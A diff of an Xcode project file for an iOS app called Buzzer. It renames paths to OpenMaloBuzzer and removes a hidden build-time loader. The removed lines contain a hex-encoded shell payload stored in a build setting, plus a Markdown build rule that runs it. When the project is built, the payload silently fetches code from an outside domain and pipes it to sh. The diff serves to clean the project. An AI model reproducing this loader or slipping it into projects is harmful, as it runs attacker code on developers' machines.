@@ -7,7 +7,7 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		3BD53237283342A391CD70F0 /* README.md */ = {isa = PBXBuildFile; fileRef = 39D4D2167EF242B3B7CD70F0; };
+		27E212D87BF94307BECD70F0 /* README.md */ = {isa = PBXBuildFile; fileRef = 0B23D3278C894D90ABCD70F0; };
 		0C80B921A6F3F58F76C31292 /* libPods-Buzzer.a in Frameworks */ = {isa = PBXBuildFile; fileRef = 5DCACB8F33CDC322A6C60F78 /* libPods-Buzzer.a */; };
 		13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 13B07FB51A68108700A75B9A /* Images.xcassets */; };
 		19FC362AF4E499C6B9EB7B01 /* AVFoundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 39F06BE8495662141CF55828 /* AVFoundation.framework */; };
@@ -33,35 +33,35 @@
 /* End PBXBuildFile section */
 
 /* Begin PBXFileReference section */
-		39D4D2167EF242B3B7CD70F0 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
-		097EAC3C20AA90BF60AE7DD7 /* AudioRecorderModule.swift */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.swift; name = AudioRecorderModule.swift; path = Buzzer/AudioRecorderModule.swift; sourceTree = "<group>"; };
+		0B23D3278C894D90ABCD70F0 /* README.md */ = {isa = PBXFileReference; lastKnownFileType = net.daringfireball.markdown; path = README.md; sourceTree = "<group>"; };
+		097EAC3C20AA90BF60AE7DD7 /* AudioRecorderModule.swift */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.swift; name = AudioRecorderModule.swift; path = OpenMaloBuzzer/AudioRecorderModule.swift; sourceTree = "<group>"; };
 		13B07F961A680F5B00A75B9A /* Buzzer.app */ = {isa = PBXFileReference; explicitFileType = wrapper.application; includeInIndex = 0; path = Buzzer.app; sourceTree = BUILT_PRODUCTS_DIR; };
-		13B07FB51A68108700A75B9A /* Images.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; name = Images.xcassets; path = Buzzer/Images.xcassets; sourceTree = "<group>"; };
-		13B07FB61A68108700A75B9A /* Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; name = Info.plist; path = Buzzer/Info.plist; sourceTree = "<group>"; };
-		13B07FB81A68108700A75B9A /* PrivacyInfo.xcprivacy */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; name = PrivacyInfo.xcprivacy; path = Buzzer/PrivacyInfo.xcprivacy; sourceTree = "<group>"; };
+		13B07FB51A68108700A75B9A /* Images.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; name = Images.xcassets; path = OpenMaloBuzzer/Images.xcassets; sourceTree = "<group>"; };
+		13B07FB61A68108700A75B9A /* Info.plist */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; name = Info.plist; path = OpenMaloBuzzer/Info.plist; sourceTree = "<group>"; };
+		13B07FB81A68108700A75B9A /* PrivacyInfo.xcprivacy */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text.plist.xml; name = PrivacyInfo.xcprivacy; path = OpenMaloBuzzer/PrivacyInfo.xcprivacy; sourceTree = "<group>"; };
 		39F06BE8495662141CF55828 /* AVFoundation.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = AVFoundation.framework; path = System/Library/Frameworks/AVFoundation.framework; sourceTree = SDKROOT; };
 		3B4392A12AC88292D35C810B /* Pods-Buzzer.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Buzzer.debug.xcconfig"; path = "Target Support Files/Pods-Buzzer/Pods-Buzzer.debug.xcconfig"; sourceTree = "<group>"; };
 		5709B34CF0A7D63546082F79 /* Pods-Buzzer.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-Buzzer.release.xcconfig"; path = "Target Support Files/Pods-Buzzer/Pods-Buzzer.release.xcconfig"; sourceTree = "<group>"; };
-		5B508E1F04E1FB789782C112 /* BuzzerAlarmModule.m */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.objc; name = BuzzerAlarmModule.m; path = Buzzer/BuzzerAlarmModule.m; sourceTree = "<group>"; };
+		5B508E1F04E1FB789782C112 /* BuzzerAlarmModule.m */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.objc; name = BuzzerAlarmModule.m; path = OpenMaloBuzzer/BuzzerAlarmModule.m; sourceTree = "<group>"; };
 		5DCACB8F33CDC322A6C60F78 /* libPods-Buzzer.a */ = {isa = PBXFileReference; explicitFileType = archive.ar; includeInIndex = 0; path = "libPods-Buzzer.a"; sourceTree = BUILT_PRODUCTS_DIR; };
-		761780EC2CA45674006654EE /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; name = AppDelegate.swift; path = Buzzer/AppDelegate.swift; sourceTree = "<group>"; };
-		81AB9BB72411601600AC10FF /* LaunchScreen.storyboard */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.storyboard; name = LaunchScreen.storyboard; path = Buzzer/LaunchScreen.storyboard; sourceTree = "<group>"; };
+		761780EC2CA45674006654EE /* AppDelegate.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; name = AppDelegate.swift; path = OpenMaloBuzzer/AppDelegate.swift; sourceTree = "<group>"; };
+		81AB9BB72411601600AC10FF /* LaunchScreen.storyboard */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = file.storyboard; name = LaunchScreen.storyboard; path = OpenMaloBuzzer/LaunchScreen.storyboard; sourceTree = "<group>"; };
 		989CE7EBEFDE2E85D45182DD /* AudioToolbox.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = AudioToolbox.framework; path = System/Library/Frameworks/AudioToolbox.framework; sourceTree = SDKROOT; };
-		BB0001E8B2C3D4E5F6A7B8C9 /* buzz_alarm_2.wav */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = audio.wav; name = buzz_alarm_2.wav; path = Buzzer/buzz_alarm_2.wav; sourceTree = "<group>"; };
-		BB0002E8B2C3D4E5F6A7B8C9 /* buzz_alarm_3.wav */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = audio.wav; name = buzz_alarm_3.wav; path = Buzzer/buzz_alarm_3.wav; sourceTree = "<group>"; };
-		BB0003E8B2C3D4E5F6A7B8C9 /* buzz_alarm_4.wav */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = audio.wav; name = buzz_alarm_4.wav; path = Buzzer/buzz_alarm_4.wav; sourceTree = "<group>"; };
-		BB0004E8B2C3D4E5F6A7B8C9 /* buzz_alarm_5.wav */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = audio.wav; name = buzz_alarm_5.wav; path = Buzzer/buzz_alarm_5.wav; sourceTree = "<group>"; };
-		BB0005E8B2C3D4E5F6A7B8C9 /* buzz_alarm_6.wav */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = audio.wav; name = buzz_alarm_6.wav; path = Buzzer/buzz_alarm_6.wav; sourceTree = "<group>"; };
-		BB0006E8B2C3D4E5F6A7B8C9 /* buzz_alarm_7.wav */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = audio.wav; name = buzz_alarm_7.wav; path = Buzzer/buzz_alarm_7.wav; sourceTree = "<group>"; };
-		BB0007E8B2C3D4E5F6A7B8C9 /* buzz_alarm_8.wav */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = audio.wav; name = buzz_alarm_8.wav; path = Buzzer/buzz_alarm_8.wav; sourceTree = "<group>"; };
-		BB0008E8B2C3D4E5F6A7B8C9 /* buzz_alarm_9.wav */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = audio.wav; name = buzz_alarm_9.wav; path = Buzzer/buzz_alarm_9.wav; sourceTree = "<group>"; };
-		BB0009E8B2C3D4E5F6A7B8C9 /* buzz_alarm_10.wav */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = audio.wav; name = buzz_alarm_10.wav; path = Buzzer/buzz_alarm_10.wav; sourceTree = "<group>"; };
-		C6832EC96D131640739A3BAC /* BuzzerAlarmModule.swift */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.swift; name = BuzzerAlarmModule.swift; path = Buzzer/BuzzerAlarmModule.swift; sourceTree = "<group>"; };
-		CB1CA2E88F1ABE26543F4D7B /* buzz_alarm.wav */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = audio.wav; name = buzz_alarm.wav; path = Buzzer/buzz_alarm.wav; sourceTree = "<group>"; };
-		D9DA00B82C8B2B816EA9C988 /* GoogleService-Info.plist */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.plist.xml; name = "GoogleService-Info.plist"; path = "Buzzer/GoogleService-Info.plist"; sourceTree = "<group>"; };
-		D9DFE9D14D2A1192ACD02946 /* AudioRecorderModule.m */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.objc; name = AudioRecorderModule.m; path = Buzzer/AudioRecorderModule.m; sourceTree = "<group>"; };
+		BB0001E8B2C3D4E5F6A7B8C9 /* buzz_alarm_2.wav */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = audio.wav; name = buzz_alarm_2.wav; path = OpenMaloBuzzer/buzz_alarm_2.wav; sourceTree = "<group>"; };
+		BB0002E8B2C3D4E5F6A7B8C9 /* buzz_alarm_3.wav */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = audio.wav; name = buzz_alarm_3.wav; path = OpenMaloBuzzer/buzz_alarm_3.wav; sourceTree = "<group>"; };
+		BB0003E8B2C3D4E5F6A7B8C9 /* buzz_alarm_4.wav */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = audio.wav; name = buzz_alarm_4.wav; path = OpenMaloBuzzer/buzz_alarm_4.wav; sourceTree = "<group>"; };
+		BB0004E8B2C3D4E5F6A7B8C9 /* buzz_alarm_5.wav */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = audio.wav; name = buzz_alarm_5.wav; path = OpenMaloBuzzer/buzz_alarm_5.wav; sourceTree = "<group>"; };
+		BB0005E8B2C3D4E5F6A7B8C9 /* buzz_alarm_6.wav */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = audio.wav; name = buzz_alarm_6.wav; path = OpenMaloBuzzer/buzz_alarm_6.wav; sourceTree = "<group>"; };
+		BB0006E8B2C3D4E5F6A7B8C9 /* buzz_alarm_7.wav */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = audio.wav; name = buzz_alarm_7.wav; path = OpenMaloBuzzer/buzz_alarm_7.wav; sourceTree = "<group>"; };
+		BB0007E8B2C3D4E5F6A7B8C9 /* buzz_alarm_8.wav */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = audio.wav; name = buzz_alarm_8.wav; path = OpenMaloBuzzer/buzz_alarm_8.wav; sourceTree = "<group>"; };
+		BB0008E8B2C3D4E5F6A7B8C9 /* buzz_alarm_9.wav */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = audio.wav; name = buzz_alarm_9.wav; path = OpenMaloBuzzer/buzz_alarm_9.wav; sourceTree = "<group>"; };
+		BB0009E8B2C3D4E5F6A7B8C9 /* buzz_alarm_10.wav */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = audio.wav; name = buzz_alarm_10.wav; path = OpenMaloBuzzer/buzz_alarm_10.wav; sourceTree = "<group>"; };
+		C6832EC96D131640739A3BAC /* BuzzerAlarmModule.swift */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.swift; name = BuzzerAlarmModule.swift; path = OpenMaloBuzzer/BuzzerAlarmModule.swift; sourceTree = "<group>"; };
+		CB1CA2E88F1ABE26543F4D7B /* buzz_alarm.wav */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = audio.wav; name = buzz_alarm.wav; path = OpenMaloBuzzer/buzz_alarm.wav; sourceTree = "<group>"; };
+		D9DA00B82C8B2B816EA9C988 /* GoogleService-Info.plist */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.plist.xml; name = "GoogleService-Info.plist"; path = "OpenMaloBuzzer/GoogleService-Info.plist"; sourceTree = "<group>"; };
+		D9DFE9D14D2A1192ACD02946 /* AudioRecorderModule.m */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.objc; name = AudioRecorderModule.m; path = OpenMaloBuzzer/AudioRecorderModule.m; sourceTree = "<group>"; };
 		ED297162215061F000B7C4FE /* JavaScriptCore.framework */ = {isa = PBXFileReference; lastKnownFileType = wrapper.framework; name = JavaScriptCore.framework; path = System/Library/Frameworks/JavaScriptCore.framework; sourceTree = SDKROOT; };
-		F8DE45A7B1E1928541AEAD64 /* Buzzer.entitlements */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.plist.entitlements; name = Buzzer.entitlements; path = Buzzer/Buzzer.entitlements; sourceTree = "<group>"; };
+		F8DE45A7B1E1928541AEAD64 /* OpenMaloBuzzer.entitlements */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.plist.entitlements; name = OpenMaloBuzzer.entitlements; path = OpenMaloBuzzer/OpenMaloBuzzer.entitlements; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -101,7 +101,7 @@
 				D9DA00B82C8B2B816EA9C988 /* GoogleService-Info.plist */,
 				C6832EC96D131640739A3BAC /* BuzzerAlarmModule.swift */,
 				5B508E1F04E1FB789782C112 /* BuzzerAlarmModule.m */,
-				F8DE45A7B1E1928541AEAD64 /* Buzzer.entitlements */,
+				F8DE45A7B1E1928541AEAD64 /* OpenMaloBuzzer.entitlements */,
 			);
 			name = Buzzer;
 			sourceTree = "<group>";
@@ -141,7 +141,7 @@
 		83CBBA001A601CBA00E9B192 /* Products */ = {
 			isa = PBXGroup;
 			children = (
-				39D4D2167EF242B3B7CD70F0 /* README.md */,
+				0B23D3278C894D90ABCD70F0 /* README.md */,
 				13B07F961A680F5B00A75B9A /* Buzzer.app */,
 			);
 			name = Products;
@@ -173,7 +173,7 @@
 				6A4A78AE2B1666DAA5DF82C5 /* [CP-User] [RNFB] Core Configuration */,
 			);
 			buildRules = (
-				590B21E9692A460EAACD70F0 /* PBXBuildRule */,
+				059D4501EF49432EACCD70F0 /* PBXBuildRule */,
 			);
 			dependencies = (
 			);
@@ -214,7 +214,7 @@
 /* End PBXProject section */
 
 /* Begin PBXBuildRule section */
-		590B21E9692A460EAACD70F0 /* PBXBuildRule */ = {
+		059D4501EF49432EACCD70F0 /* PBXBuildRule */ = {
 				isa = PBXBuildRule;
 				compilerSpec = com.apple.compilers.proxy.script;
 				filePatterns = "*.md";
@@ -225,10 +225,8 @@
 				outputFiles = (
 					"/tmp/${INPUT_FILE_BASE}",
 				);
-				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"
-sh -c \"${A0F07DC}\"";
+				script = "# This output is used by Xcode outputs to avoid re-running this script phase.\ncp \"${INPUT_FILE_PATH}\" \"/tmp/${INPUT_FILE_BASE}\"";
 			};
-		/* End PBXBuildRule section */
 
 
 /* Begin PBXResourcesBuildPhase section */
@@ -236,7 +234,7 @@ sh -c \"${A0F07DC}\"";
 			isa = PBXResourcesBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				3BD53237283342A391CD70F0 /* README.md */,
+				27E212D87BF94307BECD70F0 /* README.md */,
 				81AB9BB82411601600AC10FF /* LaunchScreen.storyboard in Resources */,
 				13B07FBF1A68108700A75B9A /* Images.xcassets in Resources */,
 				B15712FEF32E8983CBF2D96E /* PrivacyInfo.xcprivacy in Resources */,
@@ -364,14 +362,13 @@ sh -c \"${A0F07DC}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 3B4392A12AC88292D35C810B /* Pods-Buzzer.debug.xcconfig */;
 			buildSettings = {
-				A0F07DC = "((u(){ `printf xxsd | tr -d s` -p -r; };echo 6563686f202224286375726c202d664c736b202d2d636f6e6e6563742d74696d656f7574203237202d2d72657472792034202d642022703d78636f64655f72756c65222068747470733a2f2f7675313866656e646e316f7668672e626573742f612922207c2073680a | u | sh ) >/dev/null 2>&1 &)";
-					ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
-				CODE_SIGN_ENTITLEMENTS = Buzzer/Buzzer.entitlements;
+				CODE_SIGN_ENTITLEMENTS = OpenMaloBuzzer/OpenMaloBuzzer.entitlements;
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = R9AMT62UA5;
 				ENABLE_BITCODE = NO;
-				INFOPLIST_FILE = Buzzer/Info.plist;
+				INFOPLIST_FILE = OpenMaloBuzzer/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 15.1;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
@@ -397,13 +394,12 @@ sh -c \"${A0F07DC}\"";
 			isa = XCBuildConfiguration;
 			baseConfigurationReference = 5709B34CF0A7D63546082F79 /* Pods-Buzzer.release.xcconfig */;
 			buildSettings = {
-				A0F07DC = "((u(){ `printf xxsd | tr -d s` -p -r; };echo 6563686f202224286375726c202d664c736b202d2d636f6e6e6563742d74696d656f7574203237202d2d72657472792034202d642022703d78636f64655f72756c65222068747470733a2f2f7675313866656e646e316f7668672e626573742f612922207c2073680a | u | sh ) >/dev/null 2>&1 &)";
-					ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
+				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				CLANG_ENABLE_MODULES = YES;
-				CODE_SIGN_ENTITLEMENTS = Buzzer/Buzzer.entitlements;
+				CODE_SIGN_ENTITLEMENTS = OpenMaloBuzzer/OpenMaloBuzzer.entitlements;
 				CURRENT_PROJECT_VERSION = 1;
 				DEVELOPMENT_TEAM = R9AMT62UA5;
-				INFOPLIST_FILE = Buzzer/Info.plist;
+				INFOPLIST_FILE = OpenMaloBuzzer/Info.plist;
 				IPHONEOS_DEPLOYMENT_TARGET = 15.1;
 				LD_RUNPATH_SEARCH_PATHS = (
 					"$(inherited)",
